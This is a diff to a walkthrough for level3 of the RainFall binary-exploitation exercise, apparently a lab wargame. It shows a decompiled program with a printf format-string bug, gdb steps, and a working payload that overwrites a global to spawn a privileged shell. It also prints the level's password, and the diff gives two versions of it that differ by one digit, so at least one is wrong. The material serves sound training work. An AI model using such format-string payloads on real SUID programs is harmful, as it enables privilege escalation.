@@ -1,3 +1,24 @@
+We get in the level3, then we list the files in the home directory:
+
+```
+    level3@RainFall:~$ ls -la
+    -rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
+```
+The binary is owned by level4 and has the SUID bit set, meaning if it executes any shell, it will run with level4's privileges.
+
+We try to execute the binary file to get an idea of what it does exactly
+
+```
+    level3@RainFall:~$ ./level3 
+    sdasdas
+    sdasdas
+    level3@RainFall:~$ ./level3 
+    sdasdjasgdhsajgdhjasgdhjasgdjhasgdhajsgdhjasgdjhasgdjhasgdasjhgdasjhgdasjhgdjhasgdasjhgdjhasgdas
+    sdasdjasgdhsajgdhjasgdhjasgdjhasgdhajsgdhjasgdjhasgdjhasgdasjhgdasjhgdasjhgdjhasgdasjhgdjhasgdas
+    level3@RainFall:~$ 
+```
+
+We decompile the binary to get the source code:
 
 ```
     int m = 0;
@@ -27,13 +48,13 @@
     }
 ```
 
-We have a global variable m is initialized to 0 if m == 60, the v() function prints “Wait what?!” and spawns a shell.
+We have a global variable m which is initialized to 0 if m == 60, the v() function prints “Wait what?!” and spawns a shell.
 
 Since m is a global, not a stack variable, we need to find its memory address and then include that in our input to overwrite it to 60.
 
 and we have printf(buffer); a format string vulnerability to overwrite the global variable m with 60
 
-Lets find the adress of m 
+Lets find the adress of m:
 
 ```
     (gdb) info variables
@@ -75,11 +96,14 @@ geting the argument in the stack:
 the argument is 4
 
 ```
-    level3@RainFall:~$ (python -c 'print("\x8c\x98\x04\x08" + "%60c%4$n")'; cat) | ./level3
+    level3@RainFall:~$ python -c 'print("\x8c\x98\x04\x08" + "%60c%4$n")' >> /tmp/level3.exploit
+    level3@RainFall:~$ (cat /tmp/level3.exploit ; cat) | ./level3 
     �                                                           
     Wait what?!
+    whoami
+    level4
     cat /home/user/level4/.pass
-    b209ea91ad69ef36f2cf0fcbbc24c739fd10460cf545b20bea8572ebdc3c36fa
+    b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 ```
 
 
@@ -89,10 +113,13 @@ the argument is 4
 
 %4$n => Writes the current character count (60) into the 4th argument on the stack, which is our memory address.
 
-So, the result is Write the number 60 into the address 0x0804988c.
+We jump to next level
 
 ```
-    ./level3 <<< $(python -c 'print("\x8c\x98\x04\x08" + "%60c%4$n" + ".%x." * 30)')
-    �                                                           .b7fd1ac0..b7ff37d0..804988c..63303625..6e243425..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e.
-    Wait what?!
+level3@RainFall:~$ su level4 
+Password:b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
+level4@RainFall:~$ 
 ```
+
